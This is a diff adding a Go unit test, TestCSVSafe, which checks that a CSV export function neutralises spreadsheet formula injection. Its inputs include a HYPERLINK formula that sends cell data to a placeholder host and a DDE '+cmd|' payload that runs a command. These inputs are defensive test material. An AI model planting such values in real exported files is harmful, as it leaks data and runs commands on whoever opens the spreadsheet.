@@ -69,3 +69,19 @@ func TestTranslateType(t *testing.T) {
 	// Unknown falls back to lower-cased raw value.
 	assert.Equal(t, "unknown", translateType(entities.TransactionType("UNKNOWN")))
 }
+
+func TestCSVSafe(t *testing.T) {
+	cases := map[string]string{
+		"Mercado":                         "Mercado",
+		"":                                "",
+		`=HYPERLINK("http://x/?"&A1;"x")`: `'=HYPERLINK("http://x/?"&A1;"x")`,
+		"+cmd|' /C calc'!A0":              "'+cmd|' /C calc'!A0",
+		"-2+3":                            "'-2+3",
+		"@SUM(A1)":                        "'@SUM(A1)",
+		"\t=1":                            "'\t=1",
+		"Pix de João = amigo":             "Pix de João = amigo",
+	}
+	for in, want := range cases {
+		assert.Equal(t, want, csvSafe(in), in)
+	}
+}
